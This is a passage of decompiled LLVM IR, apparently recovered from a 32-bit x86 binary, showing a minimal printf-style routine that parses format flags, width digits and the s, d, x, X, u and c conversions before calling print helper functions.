  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804859c = load i32, i32* @ebp, align 4
  store i32 %v0_804859c, i32* %stack_var_-4, align 4
  %v15_804859f = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048791 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80487c745 = load i8, i8* %stack_var_8.444, align 1
  %v3_80487c746 = zext i8 %v2_80487c745 to i32
  %v5_80487c747 = and i32 %arg2, -256
  %v6_80487c748 = or i32 %v3_80487c746, %v5_80487c747
  store i32 %v6_80487c748, i32* %eax.global-to-local, align 4
  %v4_80487c949 = icmp eq i8 %v2_80487c745, 0
  %v1_80487cb50 = icmp eq i1 %v4_80487c949, false
  br i1 %v1_80487cb50, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80485ae:                             ; preds = %entry, %dec_label_pc_80487c1
  %v0_80487af = phi i32 [ %v4_804867366, %dec_label_pc_80487c1 ], [ %v15_804859f, %entry ]
  %v5_80487c756 = phi i32 [ %v5_80487c7, %dec_label_pc_80487c1 ], [ %v5_80487c747, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_80487c1 ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80487c1 ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_80487c1, %dec_label_pc_80487c1 ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_80487c1 ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_80487c1 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_80485b1 = load i8, i8* %stack_var_8.455, align 1
  %v3_80485b1 = zext i8 %v2_80485b1 to i32
  %v6_80485b1 = or i32 %v3_80485b1, %v5_80487c756
  store i32 %v6_80485b1, i32* %eax.global-to-local, align 4
  %v10_80485b3 = icmp eq i8 %v2_80485b1, 37
  %v1_80485b5 = icmp eq i1 %v10_80485b3, false
  br i1 %v1_80485b5, label %dec_label_pc_80487a5, label %dec_label_pc_80485bb

dec_label_pc_80485bb:                             ; preds = %dec_label_pc_80485ae
  %v5_80485bb = add i32 %stack_var_8.4.in53, 1
  %v22_80485bb = inttoptr i32 %v5_80485bb to i8*
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485ce = load i8, i8* %v22_80485bb, align 1
  %v3_80485ce = zext i8 %v2_80485ce to i32
  %v5_80485ce = and i32 %v5_80485bb, -256
  %v6_80485ce = or i32 %v3_80485ce, %v5_80485ce
  store i32 %v6_80485ce, i32* %eax.global-to-local, align 4
  %v4_80485d0 = icmp eq i8 %v2_80485ce, 0
  br i1 %v4_80485d0, label %dec_label_pc_80487d1, label %dec_label_pc_80485d8

dec_label_pc_80485d8:                             ; preds = %dec_label_pc_80485bb
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485db = load i8, i8* %v22_80485bb, align 1
  %v3_80485db = zext i8 %v2_80485db to i32
  %v6_80485db = or i32 %v3_80485db, %v5_80485ce
  store i32 %v6_80485db, i32* %eax.global-to-local, align 4
  %v10_80485dd = icmp eq i8 %v2_80485db, 37
  br i1 %v10_80485dd, label %dec_label_pc_80487a5, label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485d8
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485e8 = load i8, i8* %v22_80485bb, align 1
  %v3_80485e8 = zext i8 %v2_80485e8 to i32
  %v6_80485e8 = or i32 %v3_80485e8, %v5_80485ce
  store i32 %v6_80485e8, i32* %eax.global-to-local, align 4
  %v10_80485ea = icmp eq i8 %v2_80485e8, 45
  %v1_80485ec = icmp eq i1 %v10_80485ea, false
  br i1 %v1_80485ec, label %dec_label_pc_8048601.preheader, label %dec_label_pc_80485ee

dec_label_pc_80485ee:                             ; preds = %dec_label_pc_80485e5
  %v5_80485ee = add i32 %stack_var_8.4.in53, 2
  %v22_80485ee = inttoptr i32 %v5_80485ee to i8*
  br label %dec_label_pc_8048601.preheader

dec_label_pc_8048601.preheader:                   ; preds = %dec_label_pc_80485ee, %dec_label_pc_80485e5
  %stack_var_8.0.ph = phi i8* [ %v22_80485bb, %dec_label_pc_80485e5 ], [ %v22_80485ee, %dec_label_pc_80485ee ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_80485e5 ], [ 1, %dec_label_pc_80485ee ]
  %v4_804860115 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804860115, i32* %eax.global-to-local, align 4
  %v2_804860416 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804860417 = zext i8 %v2_804860416 to i32
  %v5_804860418 = and i32 %v4_804860115, -256
  %v6_804860419 = or i32 %v3_804860417, %v5_804860418
  store i32 %v6_804860419, i32* %eax.global-to-local, align 4
  %v7_804860621 = icmp eq i8 %v2_804860416, 48
  br i1 %v7_804860621, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_80485fa:                             ; preds = %dec_label_pc_8048601.preheader, %dec_label_pc_80485fa
  %v4_804860123 = phi i32 [ %v5_80485fa, %dec_label_pc_80485fa ], [ %v4_804860115, %dec_label_pc_8048601.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_80485fd, %dec_label_pc_80485fa ], [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ]
  %v5_80485fa = add i32 %v4_804860123, 1
  %v22_80485fa = inttoptr i32 %v5_80485fa to i8*
  %v4_80485fd = or i32 %stack_var_-32.022, 2
  store i32 %v5_80485fa, i32* %eax.global-to-local, align 4
  %v2_8048604 = load i8, i8* %v22_80485fa, align 1
  %v3_8048604 = zext i8 %v2_8048604 to i32
  %v5_8048604 = and i32 %v5_80485fa, -256
  %v6_8048604 = or i32 %v3_8048604, %v5_8048604
  store i32 %v6_8048604, i32* %eax.global-to-local, align 4
  %v7_8048606 = icmp eq i8 %v2_8048604, 48
  br i1 %v7_8048606, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_8048630.preheader:                   ; preds = %dec_label_pc_80485fa, %dec_label_pc_8048601.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ], [ %v4_80485fd, %dec_label_pc_80485fa ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048601.preheader ], [ %v22_80485fa, %dec_label_pc_80485fa ]
  %v4_804863025 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804863025, i32* %eax.global-to-local, align 4
  %v2_804863326 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804863327 = zext i8 %v2_804863326 to i32
  %v5_804863328 = and i32 %v4_804863025, -256
  %v6_804863329 = or i32 %v3_804863327, %v5_804863328
  store i32 %v6_804863329, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_804863326, 48
  br i1 %tmp67, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_804860c:                             ; preds = %dec_label_pc_8048639
  %v2_8048615 = mul i32 %stack_var_-36.032, 10
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804861d = load i8, i8* %stack_var_8.133, align 1
  %v3_804861d = zext i8 %v2_804861d to i32
  %v5_8048624 = add i32 %v3_804861d, %v2_8048615
  %v1_8048627 = add i32 %v5_8048624, -48
  %v5_804862d = add i32 %v4_804863034, 1
  %v22_804862d = inttoptr i32 %v5_804862d to i8*
  store i32 %v5_804862d, i32* %eax.global-to-local, align 4
  %v2_8048633 = load i8, i8* %v22_804862d, align 1
  %v3_8048633 = zext i8 %v2_8048633 to i32
  %v5_8048633 = and i32 %v5_804862d, -256
  %v6_8048633 = or i32 %v3_8048633, %v5_8048633
  store i32 %v6_8048633, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_8048633, 48
  br i1 %tmp68, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_8048639:                             ; preds = %dec_label_pc_8048630.preheader, %dec_label_pc_804860c
  %v5_804863335 = phi i32 [ %v5_8048633, %dec_label_pc_804860c ], [ %v5_804863328, %dec_label_pc_8048630.preheader ]
  %v4_804863034 = phi i32 [ %v5_804862d, %dec_label_pc_804860c ], [ %v4_804863025, %dec_label_pc_8048630.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_804862d, %dec_label_pc_804860c ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_8048627, %dec_label_pc_804860c ], [ 0, %dec_label_pc_8048630.preheader ]
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804863c = load i8, i8* %stack_var_8.133, align 1
  %v3_804863c = zext i8 %v2_804863c to i32
  %v6_804863c = or i32 %v3_804863c, %v5_804863335
  store i32 %v6_804863c, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_804863c, 58
  br i1 %tmp69, label %dec_label_pc_804860c, label %dec_label_pc_8048642

dec_label_pc_8048642:                             ; preds = %dec_label_pc_804860c, %dec_label_pc_8048639, %dec_label_pc_8048630.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_8048630.preheader ], [ %stack_var_-36.032, %dec_label_pc_8048639 ], [ %v1_8048627, %dec_label_pc_804860c ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ], [ %stack_var_8.133, %dec_label_pc_8048639 ], [ %v22_804862d, %dec_label_pc_804860c ]
  %v4_8048630.lcssa = phi i32 [ %v4_804863025, %dec_label_pc_8048630.preheader ], [ %v4_804863034, %dec_label_pc_8048639 ], [ %v5_804862d, %dec_label_pc_804860c ]
  %v5_8048633.lcssa = phi i32 [ %v5_804863328, %dec_label_pc_8048630.preheader ], [ %v5_804863335, %dec_label_pc_8048639 ], [ %v5_8048633, %dec_label_pc_804860c ]
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048645 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048645 = zext i8 %v2_8048645 to i32
  %v6_8048645 = or i32 %v3_8048645, %v5_8048633.lcssa
  store i32 %v6_8048645, i32* %eax.global-to-local, align 4
  %v10_8048647 = icmp eq i8 %v2_8048645, 115
  %v1_8048649 = icmp eq i1 %v10_8048647, false
  br i1 %v1_8048649, label %dec_label_pc_804868d, label %dec_label_pc_804864b

dec_label_pc_804864b:                             ; preds = %dec_label_pc_8048642
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804864e = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048656 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048656 = load i32, i32* %v1_8048656, align 4
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v4_804865b = icmp eq i32 %v2_8048656, 0
  br i1 %v4_804865b, label %dec_label_pc_8048670, label %dec_label_pc_8048661

dec_label_pc_8048661:                             ; preds = %dec_label_pc_804864b
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v5_8048664 = inttoptr i32 %v2_8048656 to i8*
  br label %dec_label_pc_8048670

dec_label_pc_8048670:                             ; preds = %dec_label_pc_804864b, %dec_label_pc_8048661
  %storemerge = phi i8* [ %v5_8048664, %dec_label_pc_8048661 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805765e.12, i32 0, i32 0), %dec_label_pc_804864b ]
  %v4_8048670 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8048670, i32* %eax.global-to-local, align 4
  %v5_8048673 = add i32 %v0_80487af, -4
  %v6_8048673 = inttoptr i32 %v5_8048673 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048673, align 4
  %v5_8048676 = add i32 %v0_80487af, -8
  %v6_8048676 = inttoptr i32 %v5_8048676 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048676, align 4
  %v0_8048679 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048679 = add i32 %v0_80487af, -12
  %v3_8048679 = inttoptr i32 %v2_8048679 to i32*
  store i32 %v0_8048679, i32* %v3_8048679, align 4
  %v5_804867a = add i32 %v0_80487af, -16
  %v6_804867a = inttoptr i32 %v5_804867a to i32*
  store i32 %tmp3, i32* %v6_804867a, align 4
  %v5_804867d = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804867d = call i32 @prints(i32 %v4_8048670, i8* %v5_804867d, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_804867d, i32* %eax.global-to-local, align 4
  %v0_8048682 = load i32, i32* @esp, align 4
  %v1_8048682 = add i32 %v0_8048682, 16
  %v5_8048685 = add i32 %v6_804867d, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048642
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048690 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048690 = zext i8 %v2_8048690 to i32
  %v6_8048690 = or i32 %v3_8048690, %v5_8048633.lcssa
  store i32 %v6_8048690, i32* %eax.global-to-local, align 4
  %v10_8048692 = icmp eq i8 %v2_8048690, 100
  %v1_8048694 = icmp eq i1 %v10_8048692, false
  br i1 %v1_8048694, label %dec_label_pc_80486c6, label %dec_label_pc_8048696

dec_label_pc_8048696:                             ; preds = %dec_label_pc_804868d
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048699 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486a1 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486a1 = load i32, i32* %v1_80486a1, align 4
  store i32 %v2_80486a1, i32* %eax.global-to-local, align 4
  %v1_80486a6 = add i32 %v0_80487af, -8
  %v2_80486a6 = inttoptr i32 %v1_80486a6 to i32*
  store i32 97, i32* %v2_80486a6, align 4
  %v5_80486a8 = add i32 %v0_80487af, -12
  %v6_80486a8 = inttoptr i32 %v5_80486a8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486a8, align 4
  %v5_80486ab = add i32 %v0_80487af, -16
  %v6_80486ab = inttoptr i32 %v5_80486ab to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486ab, align 4
  %v1_80486ae = add i32 %v0_80487af, -20
  %v2_80486ae = inttoptr i32 %v1_80486ae to i32*
  store i32 1, i32* %v2_80486ae, align 4
  %v1_80486b0 = add i32 %v0_80487af, -24
  %v2_80486b0 = inttoptr i32 %v1_80486b0 to i32*
  store i32 10, i32* %v2_80486b0, align 4
  %v0_80486b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80486b2 = add i32 %v0_80487af, -28
  %v3_80486b2 = inttoptr i32 %v2_80486b2 to i32*
  store i32 %v0_80486b2, i32* %v3_80486b2, align 4
  %v5_80486b3 = add i32 %v0_80487af, -32
  %v6_80486b3 = inttoptr i32 %v5_80486b3 to i32*
  store i32 %tmp3, i32* %v6_80486b3, align 4
  %v1_80486b6 = call i32 @printi(i32 %v1_8048699)
  store i32 %v1_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esp, align 4
  %v1_80486bb = add i32 %v0_80486bb, 32
  %v5_80486be = add i32 %v1_80486b6, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486c6:                             ; preds = %dec_label_pc_804868d
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486c9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486c9 = zext i8 %v2_80486c9 to i32
  %v6_80486c9 = or i32 %v3_80486c9, %v5_8048633.lcssa
  store i32 %v6_80486c9, i32* %eax.global-to-local, align 4
  %v10_80486cb = icmp eq i8 %v2_80486c9, 120
  %v1_80486cd = icmp eq i1 %v10_80486cb, false
  br i1 %v1_80486cd, label %dec_label_pc_80486ff, label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_80486c6
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80486d2 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486da = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486da = load i32, i32* %v1_80486da, align 4
  store i32 %v2_80486da, i32* %eax.global-to-local, align 4
  %v1_80486df = add i32 %v0_80487af, -8
  %v2_80486df = inttoptr i32 %v1_80486df to i32*
  store i32 97, i32* %v2_80486df, align 4
  %v5_80486e1 = add i32 %v0_80487af, -12
  %v6_80486e1 = inttoptr i32 %v5_80486e1 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486e1, align 4
  %v5_80486e4 = add i32 %v0_80487af, -16
  %v6_80486e4 = inttoptr i32 %v5_80486e4 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486e4, align 4
  %v1_80486e7 = add i32 %v0_80487af, -20
  %v2_80486e7 = inttoptr i32 %v1_80486e7 to i32*
  store i32 0, i32* %v2_80486e7, align 4
  %v1_80486e9 = add i32 %v0_80487af, -24
  %v2_80486e9 = inttoptr i32 %v1_80486e9 to i32*
  store i32 16, i32* %v2_80486e9, align 4
  %v0_80486eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80486eb = add i32 %v0_80487af, -28
  %v3_80486eb = inttoptr i32 %v2_80486eb to i32*
  store i32 %v0_80486eb, i32* %v3_80486eb, align 4
  %v5_80486ec = add i32 %v0_80487af, -32
  %v6_80486ec = inttoptr i32 %v5_80486ec to i32*
  store i32 %tmp3, i32* %v6_80486ec, align 4
  %v1_80486ef = call i32 @printi(i32 %v1_80486d2)
  store i32 %v1_80486ef, i32* %eax.global-to-local, align 4
  %v0_80486f4 = load i32, i32* @esp, align 4
  %v1_80486f4 = add i32 %v0_80486f4, 32
  %v5_80486f7 = add i32 %v1_80486ef, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486ff:                             ; preds = %dec_label_pc_80486c6
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048702 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048702 = zext i8 %v2_8048702 to i32
  %v6_8048702 = or i32 %v3_8048702, %v5_8048633.lcssa
  store i32 %v6_8048702, i32* %eax.global-to-local, align 4
  %v10_8048704 = icmp eq i8 %v2_8048702, 88
  %v1_8048706 = icmp eq i1 %v10_8048704, false
  br i1 %v1_8048706, label %dec_label_pc_8048738, label %dec_label_pc_8048708

dec_label_pc_8048708:                             ; preds = %dec_label_pc_80486ff
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804870b = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048713 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048713 = load i32, i32* %v1_8048713, align 4
  store i32 %v2_8048713, i32* %eax.global-to-local, align 4
  %v1_8048718 = add i32 %v0_80487af, -8
  %v2_8048718 = inttoptr i32 %v1_8048718 to i32*
  store i32 65, i32* %v2_8048718, align 4
  %v5_804871a = add i32 %v0_80487af, -12
  %v6_804871a = inttoptr i32 %v5_804871a to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804871a, align 4
  %v5_804871d = add i32 %v0_80487af, -16
  %v6_804871d = inttoptr i32 %v5_804871d to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804871d, align 4
  %v1_8048720 = add i32 %v0_80487af, -20
  %v2_8048720 = inttoptr i32 %v1_8048720 to i32*
  store i32 0, i32* %v2_8048720, align 4
  %v1_8048722 = add i32 %v0_80487af, -24
  %v2_8048722 = inttoptr i32 %v1_8048722 to i32*
  store i32 16, i32* %v2_8048722, align 4
  %v0_8048724 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048724 = add i32 %v0_80487af, -28
  %v3_8048724 = inttoptr i32 %v2_8048724 to i32*
  store i32 %v0_8048724, i32* %v3_8048724, align 4
  %v5_8048725 = add i32 %v0_80487af, -32
  %v6_8048725 = inttoptr i32 %v5_8048725 to i32*
  store i32 %tmp3, i32* %v6_8048725, align 4
  %v1_8048728 = call i32 @printi(i32 %v1_804870b)
  store i32 %v1_8048728, i32* %eax.global-to-local, align 4
  %v0_804872d = load i32, i32* @esp, align 4
  %v1_804872d = add i32 %v0_804872d, 32
  %v5_8048730 = add i32 %v1_8048728, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_8048738:                             ; preds = %dec_label_pc_80486ff
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_804873b = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804873b = zext i8 %v2_804873b to i32
  %v6_804873b = or i32 %v3_804873b, %v5_8048633.lcssa
  store i32 %v6_804873b, i32* %eax.global-to-local, align 4
  %v10_804873d = icmp eq i8 %v2_804873b, 117
  %v1_804873f = icmp eq i1 %v10_804873d, false
  br i1 %v1_804873f, label %dec_label_pc_804876e, label %dec_label_pc_8048741

dec_label_pc_8048741:                             ; preds = %dec_label_pc_8048738
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048744 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804874c = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804874c = load i32, i32* %v1_804874c, align 4
  store i32 %v2_804874c, i32* %eax.global-to-local, align 4
  %v1_8048751 = add i32 %v0_80487af, -8
  %v2_8048751 = inttoptr i32 %v1_8048751 to i32*
  store i32 97, i32* %v2_8048751, align 4
  %v5_8048753 = add i32 %v0_80487af, -12
  %v6_8048753 = inttoptr i32 %v5_8048753 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048753, align 4
  %v5_8048756 = add i32 %v0_80487af, -16
  %v6_8048756 = inttoptr i32 %v5_8048756 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048756, align 4
  %v1_8048759 = add i32 %v0_80487af, -20
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  store i32 0, i32* %v2_8048759, align 4
  %v1_804875b = add i32 %v0_80487af, -24
  %v2_804875b = inttoptr i32 %v1_804875b to i32*
  store i32 10, i32* %v2_804875b, align 4
  %v0_804875d = load i32, i32* %eax.global-to-local, align 4
  %v2_804875d = add i32 %v0_80487af, -28
  %v3_804875d = inttoptr i32 %v2_804875d to i32*
  store i32 %v0_804875d, i32* %v3_804875d, align 4
  %v5_804875e = add i32 %v0_80487af, -32
  %v6_804875e = inttoptr i32 %v5_804875e to i32*
  store i32 %tmp3, i32* %v6_804875e, align 4
  %v1_8048761 = call i32 @printi(i32 %v1_8048744)
  store i32 %v1_8048761, i32* %eax.global-to-local, align 4
  %v0_8048766 = load i32, i32* @esp, align 4
  %v1_8048766 = add i32 %v0_8048766, 32
  %v5_8048769 = add i32 %v1_8048761, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804876e:                             ; preds = %dec_label_pc_8048738
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048771 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048771 = zext i8 %v2_8048771 to i32
  %v6_8048771 = or i32 %v3_8048771, %v5_8048633.lcssa
  store i32 %v6_8048771, i32* %eax.global-to-local, align 4
  %v10_8048773 = icmp eq i8 %v2_8048771, 99
  %v1_8048775 = icmp eq i1 %v10_8048773, false
  br i1 %v1_8048775, label %dec_label_pc_80487c1, label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_804876e
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804877a = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048782 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048782 = load i32, i32* %v1_8048782, align 4
  store i32 %v2_8048782, i32* %stack_var_-6, align 4
  %v5_804878b = add i32 %v0_80487af, -4
  %v6_804878b = inttoptr i32 %v5_804878b to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804878b, align 4
  %v5_804878e = add i32 %v0_80487af, -8
  %v6_804878e = inttoptr i32 %v5_804878e to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804878e, align 4
  store i32 %v2_8048791, i32* %eax.global-to-local, align 4
  %v2_8048794 = add i32 %v0_80487af, -12
  %v3_8048794 = inttoptr i32 %v2_8048794 to i32*
  store i32 %v2_8048791, i32* %v3_8048794, align 4
  %v5_8048795 = add i32 %v0_80487af, -16
  %v6_8048795 = inttoptr i32 %v5_8048795 to i32*
  store i32 %tmp3, i32* %v6_8048795, align 4
  %v0_8048798 = load i32, i32* %stack_var_-6, align 4
  %v6_8048798 = call i32 @prints(i32 %v0_8048798, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048798, i32* %eax.global-to-local, align 4
  %v0_804879d = load i32, i32* @esp, align 4
  %v1_804879d = add i32 %v0_804879d, 16
  %v5_80487a0 = add i32 %v6_8048798, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80487a5:                             ; preds = %dec_label_pc_80485d8, %dec_label_pc_80485ae
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_80485ae ], [ %v22_80485bb, %dec_label_pc_80485d8 ]
  %v4_80487a5 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_80487a5, i32* %eax.global-to-local, align 4
  %v2_80487a8 = load i8, i8* %stack_var_8.2, align 1
  %v3_80487a8 = zext i8 %v2_80487a8 to i32
  store i32 %v3_80487a8, i32* %eax.global-to-local, align 4
  %v2_80487b2 = add i32 %v0_80487af, -12
  %v3_80487b2 = inttoptr i32 %v2_80487b2 to i32*
  store i32 %v3_80487a8, i32* %v3_80487b2, align 4
  %v5_80487b3 = add i32 %v0_80487af, -16
  %v6_80487b3 = inttoptr i32 %v5_80487b3 to i32*
  store i32 %tmp3, i32* %v6_80487b3, align 4
  %v2_80487b6 = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_80487b6 = call i32 @printchar(i32* %v2_80487b6, i32 %stack_var_-24.151)
  store i32 %v3_80487b6, i32* %eax.global-to-local, align 4
  %v0_80487bb = load i32, i32* @esp, align 4
  %v1_80487bb = add i32 %v0_80487bb, 16
  %v4_80487be = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_80487c1

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_804876e, %dec_label_pc_8048777, %dec_label_pc_8048741, %dec_label_pc_8048708, %dec_label_pc_8048670, %dec_label_pc_80486cf, %dec_label_pc_8048696, %dec_label_pc_80487a5
  %v4_804867366 = phi i32 [ %v1_80487bb, %dec_label_pc_80487a5 ], [ %v0_80487af, %dec_label_pc_804876e ], [ %v1_804879d, %dec_label_pc_8048777 ], [ %v1_8048766, %dec_label_pc_8048741 ], [ %v1_804872d, %dec_label_pc_8048708 ], [ %v1_80486f4, %dec_label_pc_80486cf ], [ %v1_80486bb, %dec_label_pc_8048696 ], [ %v1_8048682, %dec_label_pc_8048670 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_80487a5 ], [ %stack_var_-24.151, %dec_label_pc_804876e ], [ %stack_var_-24.151, %dec_label_pc_8048777 ], [ %stack_var_-24.151, %dec_label_pc_8048741 ], [ %stack_var_-24.151, %dec_label_pc_8048708 ], [ %stack_var_-24.151, %dec_label_pc_80486cf ], [ %stack_var_-24.151, %dec_label_pc_8048696 ], [ %v2_8048656, %dec_label_pc_8048670 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_80487a5 ], [ %stack_var_12.152, %dec_label_pc_804876e ], [ %v1_804877a, %dec_label_pc_8048777 ], [ %v1_8048744, %dec_label_pc_8048741 ], [ %v1_804870b, %dec_label_pc_8048708 ], [ %v1_80486d2, %dec_label_pc_80486cf ], [ %v1_8048699, %dec_label_pc_8048696 ], [ %v1_804864e, %dec_label_pc_8048670 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80487a5 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804876e ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048777 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048741 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048708 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486cf ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048696 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048670 ]
  %stack_var_-28.0 = phi i32 [ %v4_80487be, %dec_label_pc_80487a5 ], [ %stack_var_-28.154, %dec_label_pc_804876e ], [ %v5_80487a0, %dec_label_pc_8048777 ], [ %v5_8048769, %dec_label_pc_8048741 ], [ %v5_8048730, %dec_label_pc_8048708 ], [ %v5_80486f7, %dec_label_pc_80486cf ], [ %v5_80486be, %dec_label_pc_8048696 ], [ %v5_8048685, %dec_label_pc_8048670 ]
  %v4_80487c1 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_80487c1 = add i32 %v4_80487c1, 1
